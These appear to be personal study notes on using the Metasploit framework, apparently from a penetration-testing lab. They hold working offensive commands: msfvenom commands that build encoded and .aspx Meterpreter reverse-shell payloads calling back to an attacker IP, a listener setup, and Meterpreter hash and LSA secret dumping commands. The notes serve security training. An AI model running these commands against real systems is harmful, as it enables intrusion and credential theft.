
- Modules 
	- eg. auxiliary, encoders, evasion, exploits, nops, payloads, post
	- `/usr/share/metasploit-framework/modules
- Plugins 
	- eg. aggregator.rb, alias.rb, ips_filter.rb...
	- `/usr/share/metasploit-framework/plugins
- Scripts
	- meterpreter, ps, resource, shell
	- `/usr/share/metasploit-framework/scripts
- Tools
	- command line utilities that can be called directly from `msfconsole` menu
	- `/usr/share/metasploit-framework/tools



# Modules
## Type

| **Type**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  |
| `Encoders`  | Ensure that payloads are intact to their destination.                                           |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.       |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts.                  |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist.        |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                 |

## OS
- OS tag - specifies which OS and architecture the module was created for

## Service
- Service tag - the vulnerable service that is running on target

## Name
- Name tag - the actual action that can be performed

## Searching modules
- `cve: <year>`
- `platform:<os>`
- `type:<auxiliary/exploit/post>`
- `rank:<rank>`
- `<pattern>`

# Targets
- Within an exploit
	- Some exploits need more specific target ranges
	- Can use `info` to find out more about the specific module 
- `show targets`
	- eg. IE 7 on Windows XP SP3....
- `set target <number from above>`
	- can leave as Automatic to make msf conduct service detection on target first

# Payloads
- Whether a payload is staged is represented by `/` in payload name
- eg.
	- `windows/shell_bind_tcp` is single payload with no stage
	- `windows/shell/bind/tcp` is staged, consists of
		- stager (`bind_tcp)
		- stage (`shell)
- Meterpreter
	- specific type of multi-faceted payload that uses DLL injection to ensure connection to victim host is stable, hard to detect and persistent across reboots/system changes
	- resides completely in memory of remote host, leaves no traces in hard drive
	- can also load in different Plugins 

## Searching for payloads
- `show payloads`
- grep
	- `grep meterpreer show payloads`
	- can grep more than one at a time also
		- `grep meterpreter grep reverse_tcp show payloads`

## Selecting payloads
- `set payload <no.>`

## Exploit and payload configs
- Note: to check LHOST IP quickly, can just call `ifconfig` directly from msfconsole menu
- `set Lhost <..>`
- `set Rhosts <..>`

## Meterpreter shell
- `help`
- kiv: details on meterpreter
- `shell`
	- put is into the actual command-line interface

## Payload types

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|
# Encoding
- Encode with msfvenom
- Generating payload **without** encoding
	- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`
- Generating payload **with** encoding
	- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

# Databases
- To keep track of results
- msfconsole has built in support for PostgreSQL database

Starting up database
1. Check status
	- `sudo service postgresql status`
2. Start PostgreSQL
	- `sudo systemctl start postgresql`
3. Initiate database
	- `sudo msfdbinit`

Connecting to database
-  `sudo msfdb run`

Database options
- `help database`

## Using database

Workspace
- Think of folders in a project
	- Can segregate scan results, hosts, extracted information by IP, subnet, network or domain
- View current workspace
	- `workspace`
- Add or delete workspace to database 
	- `workspace -a`
	- `workspace -d

Importing scan results
- eg. nmap scan, output in xml format.
	- `db_import Target.xml`
- Note: can even use nmap directly within msfconsole
	- `db_nmap -sV -sS IP`

Data backup
- `db_export -h`

Hosts
- `hosts -h`
- show database table automatically populated with host adresses, hostnames, other info we find about these during our scans and interactions

Services
- `services -h`
- similar as above, but for services found

Credentials
- `creds -h`
- see credentials gathered during interactions with target host
- can also add credentials manually

Loot
- `loot -h`
- works in conjunction with credentials to offer an at-a-glance list of owned services and users

# Plugins
- stored in `/usr/share/metasploit-framework/plugins`
	- if found here, can fire it up in msfconsole
		- eg. `load nessus`
- downloading plugins -> put in the directory above

# Sessions
- While runnning available exploit/auxiliary modules, can background session as long as they form a channel of communication with target host
	- Ctrl + Z or type `background 
- Listing active sessions
	- `sessions`
- Interacting with session
	- `sessions -i [no.]`
- eg.
	- Have an existing session, background it. Want to run another module, POST exploitation, on this session.
	- When selecting the next module, the `show options` menu should give an option on which session number to run this in
		- Choose the previous session.

# Jobs
- If ran an active exploit under a specific port, cannot just terminate session with Ctrl + C
	- Need to use `jobs` to look at currently active tasks running in background
	- `jobs -h`
- Running exploit as a job
	- `exploit -j`
- List all running jobs
	- `jobs -l`
- Kill specific job
	- `kill [index no.]`

# More on Meterpreter
Dumping hashes and secrets
- `hashdump
- `lsa_dump_sam`
- `lsa_dump_secrets`

# Searching in exploit db
- Google search
- `searchsploit`
	- things written in Ruby (end in .`rb`) are most likely crafted specifically for use within msfconsole
- To run newly downloaded module (eg. off github or exploit-db)
	1. Place in `/usr/share/metasploit-framework/modules/exploits`
	2. Run `reload_all` in msfconsole

# Porting over scripts into Metasploit modules
KIV.

# Msfvenom
eg. 
- Found ftp server
- Logged in, see aspnet_client
	- So this box is able to run .aspx reverse shells!
- Generate a reverse shell
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
- Then just set a listener on msfconsole
	- `msfconsole
	- `use multi/handler`
	- `set LHOST 10.10.14.5`
	- `set LPORT 1337`
- Navigate to `http://10.10.10.5/reverse_shell.aspx


# Local exploit suggester
- `search local exploit suggester`

